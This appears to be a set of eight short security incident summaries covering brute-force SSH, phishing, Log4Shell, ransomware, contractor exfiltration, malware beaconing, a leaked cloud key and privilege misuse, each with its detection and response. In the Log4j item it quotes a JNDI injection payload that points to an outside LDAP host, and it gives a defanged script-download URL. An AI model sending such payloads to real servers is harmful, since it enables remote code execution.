source: 2026-03-14 02:11:07 UTC sshd[2231]: Failed password for root from 203.0.113.45 port 52114. Between 02:11 and 02:26 the host web-prod-03 logged 1,412 failed SSH logins for users root, admin and deploy, all from 203.0.113.45. At 02:27:41 a successful login was recorded for user deploy from the same address. The deploy account then ran 'sudo -l' and downloaded a script from hxxp://update-check.example.net/a.sh. The SOC disabled the deploy account at 02:49 and blocked 203.0.113.45 at the perimeter firewall.

At 09:42 on 2026-04-02, 37 employees in the finance department received an email from payroll@paysl1p-portal.example.com with the subject 'Updated payslip - action required'. The message linked to a credential-harvesting page hosted at paysl1p-portal.example.com. Proxy logs show 6 users clicked the link and 2 users (j.harris and m.okafor) submitted credentials. Both accounts were reset at 10:15 and MFA sessions were revoked. The sender domain was added to the email blocklist and the email was purged from all mailboxes by 10:40.

The vulnerability scanner flagged app-srv-12 as running Apache Log4j 2.14.1, vulnerable to CVE-2021-44228. WAF logs from 2026-01-20 show 18 requests containing the string ${jndi:ldap://198.51.100.23:1389/Exploit} in the User-Agent header. One request at 14:03:55 returned HTTP 200 and the server made an outbound LDAP connection to 198.51.100.23 on port 1389. No further outbound connections were observed. The host was isolated at 14:30, Log4j was upgraded to 2.17.1, and the host was restored to service after a clean forensic image review.

At 23:58 on 2026-02-08, EDR raised a high-severity alert on FS-02 (file server) for mass file renames with the extension .lockd. Within 6 minutes, 4,230 files in the \\FS-02\shared\projects share were encrypted. The process responsible was svchostt.exe (SHA256 9f2b6c1d4e8a7f3b5c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b) running under the service account svc-backup. EDR automatically killed the process and isolated FS-02 at 00:05. Files were restored from the 22:00 snapshot. Initial access is believed to be a reused password on svc-backup.

DLP alerted on 2026-05-11 when laptop LT-4471, assigned to contractor r.vance, uploaded 2.3 GB to a personal cloud storage service (files.example.org) over 40 minutes starting at 17:20. The upload included a folder named 'client_contracts_2025'. The contractor's last working day was 2026-05-12. HR and Legal were informed, the contractor's access was suspended at 18:15, and the cloud provider was asked to preserve the data. The laptop was collected for forensic analysis.

Network monitoring detected host WS-1187 beaconing to 192.0.2.77 every 60 seconds over HTTPS since 2026-06-03 08:14. The destination resolves to cdn-metrics.example.com, a domain registered 3 days earlier. The beacon originated from a process named OneDriveUpdater.exe in C:\Users\Public\. The binary's MD5 hash is 5d41402abc4b2a76b9719d911017c592. The user reported installing a 'PDF converter' the previous day. WS-1187 was isolated and reimaged, and the domain was sinkholed.

On 2026-07-19 a secrets scanner found an AWS access key for the IAM user ci-deployer committed to the public repository acme/infra-tools. CloudTrail shows the key was used at 03:12 from 203.0.113.200 to launch 24 GPU instances in eu-west-2, consistent with cryptomining. The key was deactivated at 04:01, the instances were terminated, and the commit was removed from the repository history. The estimated cost of the instances was 1,860 USD.

Active Directory audit logs show that on 2026-08-27 at 16:44 the helpdesk account hd-tsmith added itself to the Domain Admins group. No change ticket exists for this action. At 16:51 the same account accessed the HR file share and copied 14 files. The change was detected by a SIEM rule at 17:05. The account was removed from Domain Admins at 17:12 and disabled pending investigation. The employee's manager confirmed no business reason for the access.
